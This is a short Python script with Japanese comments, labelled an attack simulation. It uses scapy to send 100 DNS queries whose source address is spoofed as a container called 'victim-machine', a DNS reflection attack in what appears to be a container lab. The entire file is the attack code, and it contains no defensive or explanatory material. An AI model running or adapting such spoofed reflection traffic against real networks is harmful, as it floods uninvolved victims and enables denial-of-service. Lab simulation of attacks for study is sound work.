# 攻撃シミュレーションスクリプト
import scapy.all as scapy

def dns_reflection_attack():
    # DNSサーバーと偽装された攻撃者IPアドレス
    target_dns = "dns-server"  # DNSサーバーのコンテナ名
    spoofed_ip = "victim-machine"  # 攻撃されるマシンのコンテナ名

    # DNSリクエストの作成
    dns_request = scapy.IP(src=spoofed_ip, dst=target_dns) / scapy.UDP() / scapy.DNS(qd=scapy.DNSQR(qname="example.com"))

    # 攻撃の実行
    scapy.send(dns_request, count=100)

dns_reflection_attack()
